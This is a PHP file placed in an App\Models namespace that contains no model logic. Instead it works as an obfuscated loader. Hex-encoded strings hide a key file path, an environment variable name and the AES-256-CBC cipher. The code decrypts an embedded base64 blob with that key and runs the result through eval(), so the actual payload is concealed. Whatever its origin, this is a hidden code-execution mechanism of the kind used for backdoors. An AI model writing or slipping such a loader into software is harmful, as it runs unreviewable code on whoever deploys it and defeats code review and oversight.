<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('vCdg7sXXkFsgQNOFpFXkkA==');

$c=base64_decode(

'q09YbyrXH2f1SqqEXiEg57g2UxXI48d758TbQvjeDAO0nRpo87PYdAz0bV3zGaPKt9ZyjqlKz3wd' .
'yqW+leAg2FNN9BV/Ubrz4Sw5ehC+I5GVlD+B9ZOyCBKMr/+0eSFRbCWpOu/8Z1x4lseHGoOwGfI0' .
'JGtCeaHUAy/guOJO5mNOApZh1yxelBSRItdC+g9niC14rxQF5EkmQ2UChM0Of6B8e7wMb12oDNR+' .
'INStW+iE3ibccsRTIeIE3fU1EgKHEww/vya52yqQww1rCs2zZDeJvfmDnaZ9F5J+0Y7e5Kgh7hxe' .
'eMDLD4k5/8+mO/YuABCCdgpGSTBUnhq6ElI+otr9CiM4YfxPOF7vkPEBBvfYqsTwTkL9A2fl5oaV' .
'HPhdmNmKqmMB1YnH8Y2hCMbvmOTEQ7vQkQjquuxJ2gq9Q3tZBOCflsndhrMPlw+VX7PYWUeirzcE' .
'CJNPx6CrFdKJ7CunHvEOwjbxkOCUi+N5zEVK+XmAlFRleseadUoMgLqph29u6BJaW4uUSnpvbUhZ' .
'QNMQ16X15dn2EokcoPk+UyZIxTq5Svosb12bg/U82M3AVhV0rng1HA2y39FmAYjhNK77to/AqKjQ' .
'po0aT0j4oHNnC6m/CCy6JO7kbI350WPH5GZebTsCS9DPAupLiGsmTnrT71uEIqK7jcfgKJOV93AS' .
'mCm3mxl1+rEuWWfSlB9hQOa1nkUPvk4fclYfhyv/czxGf8Et3rHufrEOW8yHfGVY1xapnc5dZSaO' .
'YWn3xpSzfiThpaFyUq13TRQmzbBTIR6seVYivI10+0t8QfjCmdVuinCq0a/fUvutjtSOGpR8nYdb' .
'kBYEPpPpYPDVB1y4U5SaIf2+rNT079DVHWoySdeA9cgM63Kfy2OUnWg1HNNcShSlo/mnHmM4JF7L' .
'w90FPLTnwp7YQLJ5Flv7ue1Hi96QbR7agIPpoqzNqEK6e25FAAH27fhB8pjBkppF7oFg7w=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

